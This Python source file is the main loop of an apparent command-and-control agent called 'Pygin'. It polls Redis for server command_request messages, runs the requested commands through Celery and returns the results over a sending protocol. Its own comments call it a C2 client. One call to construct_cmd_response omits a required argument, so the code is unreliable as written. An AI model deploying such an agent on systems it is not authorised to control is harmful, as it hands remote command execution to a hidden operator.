"""
The main process loop.
"""

from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
import argparse
import logging
import sys

from celery.result import AsyncResult
import celery
import redis

# from celery.result import AsyncResult

from src.agent_code import config, utility, tasks
from src.protocols._shared_lib import PyginMessage
from src.libs.protocol_lib import DeadDropMessageType, DeadDropMessage

# Default configuration path. This is the configuration file included with the
# agent by default.
DEFAULT_CFG_PATH = Path("./agent.cfg")

# Set up logging
logging.basicConfig(
    handlers=[logging.StreamHandler(sys.stdout)],
    level=logging.DEBUG,
    format="%(filename)s:%(lineno)d | %(asctime)s | [%(levelname)s] - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger()


@dataclass
class CommandTask:
    """
    Simple dataclass representing a command in progress and its corresponding
    command_request.
    """
    start_time: datetime
    cmd_request: DeadDropMessage
    task_result: AsyncResult

def get_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="The Pygin main process.")

    # Access this argument as cfg_path.
    parser.add_argument(
        "--cfg",
        "-c",
        default=DEFAULT_CFG_PATH,
        type=Path,
        help="The configuration variables for the agent.",
        required=False,
        dest="cfg_path",
    )

    return parser.parse_args()


def get_new_msgs(
    cfg_obj: config.PyginConfig, 
    app: celery.Celery, 
    remove_task_results: bool = True
) -> list[PyginMessage]:
    """
    Get and reconstruct all new messages in the Redis database.

    Note that this does not actually invoke the message retreival system;
    it assumes that a scheduled Celery task is responsible for initating
    remote message retrieval over a particular protocol.
    
    At a high level, this function operates as follows:
    - It retrieves all stored task IDs associated with periodic message
      retrieval tasks, then deleting those IDs from the key.
    - It uses the AsyncResult constructor by task ID to retrieve the list
      of PyginMessage associated with each task, if any.
    - All of these PyginMessages are combined into a single list. If
      the ID of a particular message has been seen before, drop and log it.
      If it has not been seen before, add it to the final result.
    - Return the remaining list of messages.

    New messages are "passed" to the main process (the control unit) by 
    periodic message checking tasks by adding their task IDs to an agreed-upon
    Redis key containing a set of strings. The main process can then "retrieve"
    these messages by taking these task IDs and manually reconstructing the
    AsyncResult by task ID. 
    
    Note that by taking the task IDs out of the Redis set, it guarantees that
    the same task result is never "used" twice, while still allowing task
    results to hang around in the Redis database for debugging purposes.
    
    However, message IDs processed by the main process are also stored in a
    separate Redis set as a safety measure to prevent messages from being read
    twice. 
    
    :param cfg_obj: The global Pygin configuration object.
    :param app: The Celery application tied to the Redis database.
    :param remove_task_results: Whether to delete the task result entries in Redis 
        after retrieval. Note that this refers to the celery-task-meta-*
        entries in the database, which may be deleted or kept without 
        consequence.
    """
    result: list[PyginMessage] = []
    redis_con: redis.Redis = utility.get_redis_con(app)
    
    # Get all task IDs stored within our inbox
    task_ids: set[str] = redis_con.smembers(cfg_obj.REDIS_NEW_MESSAGES_KEY)
    
    # Nuke that set (effectively making it empty). Note this runs the
    # theoretical risk that the type of the key stops being a set between
    # now and the next time the message checking task runs, but this should
    # not be a concern.
    redis_con.delete(cfg_obj.REDIS_NEW_MESSAGES_KEY)
    
    # For each of those, reconstruct the associated AsyncResult and add
    # the actual PyginMessages to our result (if any). Additionally, destroy
    # the associated result (which amounts to a DEL call to the Redis backend)
    # if specified.
    for task_id in task_ids:
        # We set a timeout of five seconds for the async result. There should
        # be no reason that the task is in the "inbox" but is also not complete,
        # but this serves as a safety measure.
        task = AsyncResult(task_id, app=app)
        if task.status is not celery.states.SUCCESS:
            logger.warning(f"Task {task_id} is in a non-sucessful state ({task.status})")
        msgs: list[PyginMessage] = task.get(timeout=5)
        
        for msg in msgs:
            msg_id_str = str(msg.message_id)
            
            # Check if this message's ID (as a string) is already present
            # in the list of messages the control unit has seen. If it is,
            # warn and drop the message from the result.
            if redis_con.sismember(cfg_obj.REDIS_MAIN_PROCESS_MESSAGES_SEEN_KEY, msg_id_str):
                logger.warning(f"Duplicate message seen by control unit, dropping (msg id: {msg_id_str})")
            else:
                result.append(msg)
                redis_con.sadd(cfg_obj.REDIS_MAIN_PROCESS_MESSAGES_SEEN_KEY, msg_id_str)
            
        if remove_task_results:
            # This effectively results in a delete call to the Redis backend.
            task.forget()

    return result


def get_stored_tasks(
    app: celery.Celery, prefix: str = "celery-task-meta-"
) -> list[AsyncResult]:
    """
    Get all task results currently stored in the Redis database.

    By default, this assumes that the default Celery prefix ("celery-task-meta-")
    is in use when storing task information in the Redis database.
    
    This should solely be used for debugging purposes. It is not intended
    for general use. Additionally, note that it retrieves ALL stored tasks,
    disregarding the actual function that the task result comes from.
    """
    # https://stackoverflow.com/questions/72115457/how-can-i-get-results-failures-for-celery-tasks-from-a-redis-backend-when-i-don
    task_results: list[AsyncResult] = []

    redis_con: redis.Redis = utility.get_redis_con(app)

    # Scan the Redis database for all keys matching the prefix followed by a *.
    # The assumption of celery-task-meta-* is safe for Celery. Note that SCAN
    # is non-blocking and is preferred over other methods.
    #
    # Additionally, Backend.client is specific to Redis, so we ignore mypy's linting
    # error here.
    for key in redis_con.scan_iter(f"{prefix}*"):  # type: ignore[attr-defined]
        # Grab everything after the Celery prefix, which will be the task ID.
        task_id = str(key).split(prefix, 1)[1].replace("'", "")
        # Use that task ID with our Celery application to retrieve the underlying result.
        task_results.append(AsyncResult(task_id, app=app))
    return task_results

def construct_cmd_response(
    cfg: config.PyginConfig,
    start_time: datetime,
    cmd_request: DeadDropMessage,
    task_result: AsyncResult
) -> DeadDropMessage:
    """
    Construct a command_repsonse messsage from the result of a task.
    """
    # TODO: Note that this message is unsigned! I think construction of the
    # signature should be the message dispatch unit's problem.
    return DeadDropMessage(
        message_type = DeadDropMessageType.CMD_RESPONSE,
        user_id = cmd_request.user_id,
        source_id = cfg.AGENT_ID,
        payload = {
            "cmd_name": cmd_request.payload['cmd_name'],
            "start_time": start_time.timestamp(),
            "end_time": task_result.date_done.timestamp(),
            "result": task_result.get()
        }
    )

def entrypoint(cfg_obj: config.PyginConfig, app: celery.Celery) -> None:
    """
    Main program entrypoint.

    Handles all "regular" decisionmaking at repeated intervals by checking for
    two things:
    - inspecting the Redis database for new messages from the server, as handled
      independently by a periodic Celery task; and
    - inspecting the Redis database for completed tasks, as identified by a
      common Redis key prefix used to denote command tasking.

    Upon identifying that either of these has occurred, this "main" process takes
    action accordingly.
    
    (I guess that's all C2 clients do, but this turned out to be really complicated!)
    """
    # Stores pairs of AsyncResults and their originating command_request message.
    running_commands: list[CommandTask] = []
    
    while True:
        # Check for new messages. For each message received (which should always
        # be command_request), invoke the command execution task. Store that
        # unfinished AsyncResult.
        for message in get_new_msgs(cfg_obj, app):
            if message.message_type != DeadDropMessageType.CMD_REQUEST:
                logger.error(f"Got unexpected message from server: {message}")
            
            logger.debug(f"Got the following message: {message}")
            logger.info(f"Received message with message ID {message.message_id}")
            try:
                task = tasks.execute_command.delay(message.payload['cmd_name'], message.payload['cmd_args'])
                running_commands.append(CommandTask(datetime.utcnow(), message, task))
            except Exception as e:
                # Handle arbitrary exceptions for scheduling itself.
                logger.error(f"Could not successfully schedule execution for the command: {e}")
        
        # Check if any of the command executions have finished. If so, log it, and
        # then invoke the "send message" task.
        for cmd_task in running_commands:
            cmd_request = cmd_task.cmd_request
            task = cmd_task.task_result
            
            if task.ready():
                if task.failed():
                    logger.error(f"The task for command_request {cmd_request.message_id} failed: {task.traceback}")
                    continue
                
                cmd_response = construct_cmd_response(cmd_task.start_time, cmd_request, task)
                logger.info(f"Command finished, sending command_response with ID {cmd_response.message_id}")
                logger.debug(f"Command response: {cmd_response}")
                try:
                    tasks.send_msg(cfg_obj, cmd_response, cfg_obj.SENDING_PROTOCOL)
                except Exception as e:
                    logger.error(f"Could not successfully schedule sending the following command_response: {cmd_response}")


if __name__ == "__main__":
    args = get_args()

    # Load configuration from path specified on the command line. Note that
    # this also implicitly creates the directories specified in the configuration
    # file, if they don't already exist.
    cfg_obj = config.PyginConfig.from_cfg_file(args.cfg_path)

    # Start the main agent loop with the new configuration information and the
    # global Celery tasking.
    entrypoint(cfg_obj, tasks.app)
